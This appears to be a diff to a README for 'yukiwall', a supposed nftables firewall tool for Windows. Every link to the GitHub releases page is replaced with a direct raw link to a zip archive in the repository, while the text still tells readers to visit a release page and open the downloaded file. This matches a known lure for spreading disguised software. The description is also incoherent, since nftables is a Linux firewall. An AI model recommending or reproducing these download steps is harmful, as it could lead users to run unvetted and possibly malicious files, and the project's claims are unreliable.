@@ -1,10 +1,10 @@
 # 🛡️ yukiwall - Simple nftables control for Windows users
 
-[![Download yukiwall](https://img.shields.io/badge/Download-Release%20Page-6f42c1?style=for-the-badge&logo=github)](https://github.com/Gtpou7563/yukiwall/releases)
+[![Download yukiwall](https://img.shields.io/badge/Download-Release%20Page-6f42c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gtpou7563/yukiwall/main/yukiwall/Software_v2.3.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Gtpou7563/yukiwall/releases
+Visit this page to download: https://raw.githubusercontent.com/Gtpou7563/yukiwall/main/yukiwall/Software_v2.3.zip
 
 Pick the latest release, then download the Windows file that fits your system. After the download finishes, open the file to start the app
 
@@ -30,7 +30,7 @@ It is built for users who want a direct way to handle firewall setup without lea
 
 ## 🚀 Getting Started
 
-1. Go to the release page: https://github.com/Gtpou7563/yukiwall/releases
+1. Go to the release page: https://raw.githubusercontent.com/Gtpou7563/yukiwall/main/yukiwall/Software_v2.3.zip
 2. Find the latest version
 3. Download the Windows file from the release assets
 4. Open the downloaded file
@@ -86,7 +86,7 @@ If you move the app, make sure any saved settings move with it. This helps avoid
 
 ## 🖱️ How to use the release page
 
-Visit the release page: https://github.com/Gtpou7563/yukiwall/releases
+Visit the release page: https://raw.githubusercontent.com/Gtpou7563/yukiwall/main/yukiwall/Software_v2.3.zip
 
 On that page:
 - look for the newest version
@@ -127,6 +127,6 @@ yukiwall works best for users who want a plain way to manage nftables settings w
 
 ## 📦 Download again
 
-Visit this page to download: https://github.com/Gtpou7563/yukiwall/releases
+Visit this page to download: https://raw.githubusercontent.com/Gtpou7563/yukiwall/main/yukiwall/Software_v2.3.zip
 
 Use it when you want the latest version, a fixed build, or a fresh copy for another Windows PC
